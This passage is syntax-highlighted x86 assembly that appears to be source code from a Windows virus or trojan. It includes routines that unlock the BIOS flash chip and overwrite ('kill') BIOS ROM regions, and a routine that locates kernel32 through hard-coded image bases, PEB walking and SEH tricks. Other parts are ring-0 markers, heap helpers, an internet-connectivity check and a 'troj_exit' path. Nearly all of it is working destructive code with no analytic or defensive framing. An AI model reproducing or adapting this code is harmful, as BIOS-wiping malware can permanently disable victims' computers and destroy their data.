                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0058h</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">BooleanCalculateCode</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f24h</span><span class="sc0"> </span><span class="sc1">; ==and al,0fh</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">IOForEEPROM</span><span class="sc0">

</span><span class="sc1">; * Show the BIOS Extra ROM Data in Memory  000E0000 - 000E01FF</span><span class="sc0">
</span><span class="sc1">; *   (   512 Bytes   ), and the Section  of Extra BIOS can be Writted...</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e5555h</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e2aaah</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">EnableEEPROMToWrite</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">60h</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc1">; * Kill the BIOS Extra ROM Data in Memory  000E0000 - 000E007F</span><span class="sc0">
</span><span class="sc1">; *   (   80h Bytes   )</span><span class="sc0">

                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc1">; * Show and Enable the BIOS Main ROM Data  000E0000 - 000FFFFF</span><span class="sc0">
</span><span class="sc1">; *   (   128 KB   )   can be Writted...</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f5555h</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0aah</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">EnableEEPROMToWrite</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
                        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc1">; * Kill the BIOS Main ROM Data in Memory  000FE000 - 000FE07F</span><span class="sc0">
</span><span class="sc1">; *   (   80h Bytes   )</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e0h</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

</span><span class="sc1">; * Hide BIOS Page in  000F0000 - 000FFFFF</span><span class="sc0">
</span><span class="sc1">; *    (   64 KB   )</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">BooleanCalculateCode</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100ch</span><span class="sc0"> </span><span class="sc1">; ==or al,10h</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">IOForEEPROM</span><span class="sc0">

                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; ***************************</span><span class="sc0">
</span><span class="sc1">; * Enable EEPROM to Write  *</span><span class="sc0">
</span><span class="sc1">; ***************************</span><span class="sc0">

</span><span class="sc5">EnableEEPROMToWrite</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; ***************************</span><span class="sc0">
</span><span class="sc1">; * IO for EEPROM           *</span><span class="sc0">
</span><span class="sc1">; ***************************</span><span class="sc0">

</span><span class="sc5">IOForEEPROM</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
                        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
                        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc5">BooleanCalculateCode</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">$</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">44h</span><span class="sc0">

                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
                        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
                        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

                        </span><span class="sc6">retn</span><span class="sc0">
                        
</span><span class="sc5">_get_r0_mark</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">pusha</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c0203ff0h</span><span class="sc0">
            </span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">__load</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_which_gen</span><span class="sc4">-</span><span class="sc5">__load</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">popa</span><span class="sc0">
            </span><span class="sc6">retf</span><span class="sc0">

</span><span class="sc5">_store_r0_mark</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pusha</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c0203ff0h</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">__load2</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_which_gen</span><span class="sc4">-</span><span class="sc5">__load2</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">stosd</span><span class="sc0">
            </span><span class="sc6">popa</span><span class="sc0">
            </span><span class="sc6">retf</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; alocates memory on heap</span><span class="sc0">
</span><span class="sc1">; i: eax = size</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: eax = ptr na trazenu memoriju</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">malloc</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">HEAP_ZERO_MEMORY</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">068h</span><span class="sc0">
</span><span class="sc5">_dd_heap_handle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0b8h</span><span class="sc0">
</span><span class="sc5">_dd_HeapAlloc</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; frees memory on heap</span><span class="sc0">
</span><span class="sc1">; i: eax = ptr to memory to free</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: nothing</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">free</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">068h</span><span class="sc0">
</span><span class="sc5">_dd_heap_handle_1</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0b8h</span><span class="sc0">
</span><span class="sc5">_dd_HeapFree</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; binary -&gt; ASCII</span><span class="sc0">
</span><span class="sc1">; i: eax = numba</span><span class="sc0">
</span><span class="sc1">;    edi = ptr to storage buffer</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: nothing</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">num2ascii</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"%lu"</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0b8h</span><span class="sc0">
</span><span class="sc5">_dd_wsprintfA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
            </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; ASCII -&gt; binary</span><span class="sc0">
</span><span class="sc1">; i: esi = ptr to ACIIZ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: eax = numba</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">ascii2num</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"0"</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">__2</span><span class="sc0">

            </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__1</span><span class="sc0">

</span><span class="sc5">__2</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">retn</span><span class="sc0">


</span><span class="sc5">NT_startup</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"Poruka"</span><span class="sc0">
            </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"vindoze NT detektiran"</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc5">callg</span><span class="sc0">   </span><span class="sc5">MessageBoxA</span><span class="sc0">
            
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">troj_exit</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; creates a thread</span><span class="sc0">
</span><span class="sc1">; i: eax = ptr to thread start address</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: eax = handle</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">Create_Thread</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">cdq</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2000h</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc5">callg</span><span class="sc0">   </span><span class="sc5">CreateThread</span><span class="sc0">
            
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; checks connection to Internet, relative to gdelta</span><span class="sc0">
</span><span class="sc1">; i: nothing</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: ecx = TRUE true if connection exists, otherwise FALSE</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">onlyne</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">IFDEF</span><span class="sc0">   </span><span class="sc5">LOCALHOST</span><span class="sc0">
            </span><span class="sc5">@retecx1</span><span class="sc0">                    </span><span class="sc1">; on localhost we r always online</span><span class="sc0">
</span><span class="sc9">ELSE</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc5">callg</span><span class="sc0">   </span><span class="sc5">InternetGetConnectedState</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; looks for imagebase of kernel32.dll</span><span class="sc0">
</span><span class="sc1">; i: nothing</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: eax = imagebase od kernel32.dll</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">get_base</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__tab</span><span class="sc0">                   </span><span class="sc1">; kernel imagebase table for different versions of vindoze:</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">077E00000h</span><span class="sc0">              </span><span class="sc1">; NT/W2k</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">077E80000h</span><span class="sc0">              </span><span class="sc1">; NT/W2k</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">077ED0000h</span><span class="sc0">              </span><span class="sc1">; NT/W2k</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">077F00000h</span><span class="sc0">              </span><span class="sc1">; NT/W2k</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0BFF70000h</span><span class="sc0">              </span><span class="sc1">; 95/98</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">077E60000h</span><span class="sc0">              </span><span class="sc1">; XP home</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0BFF60000h</span><span class="sc0">              </span><span class="sc1">; Me</span><span class="sc0">

</span><span class="sc5">__tab</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">7</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">; ebx = counter</span><span class="sc0">

</span><span class="sc5">__nxt_base</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">                       </span><span class="sc1">; take one imagebase</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_krnl_check</span><span class="sc0">             </span><span class="sc1">; and check it</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__got_kernel</span><span class="sc0">

            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">; check table end</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__nxt_base</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc5">TEB_PEB</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; take ptr to PEB</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; &gt; 80000000h ?</span><span class="sc0">
            </span><span class="sc6">js</span><span class="sc0">  </span><span class="sc5">__PEB_try</span><span class="sc0">               </span><span class="sc1">; !NT</span><span class="sc0">
    
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.PEB_PebLdrData</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.PEB_LDR_InInitOrderModuleList.LE_Flink</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">                       </span><span class="sc1">; go to second entry</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.LDR_ModuleBase</span><span class="sc4">-</span><span class="sc5">LDR_InInitializationOrderLdrEnt.LE_Flink</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_krnl_check</span><span class="sc0">

            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__got_kernel</span><span class="sc0">
            
</span><span class="sc5">__PEB_try</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__PEB_x</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc5">esp.EH_EstablisherFrame</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; set SEH frame manually</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__PEB_failed</span><span class="sc0">
</span><span class="sc5">__PEB_x</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc5">TEB_PEB</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; *PEB</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0b8h</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; now eax should be kernel's imagebase</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_krnl_check</span><span class="sc0">
</span><span class="sc5">__PEB_failed</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__got_kernel</span><span class="sc0">
            
</span><span class="sc5">__rec_scan</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.</span><span class="sc4">(</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc5">.Arg1.cPushad</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; take kernel return address. skip pushad, SEH and one call</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">              </span><span class="sc1">; align to 10 pages</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc0">               </span><span class="sc1">; add 10 pages</span><span class="sc0">

</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc0">               </span><span class="sc1">; and loop per 10 pages</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_krnl_check</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__got_kernel</span><span class="sc0">

            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__1</span><span class="sc0">                 </span><span class="sc1">; we r gonna find that bloody kernel :)</span><span class="sc0">

</span><span class="sc5">__got_kernel</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">ret</span><span class="sc0">

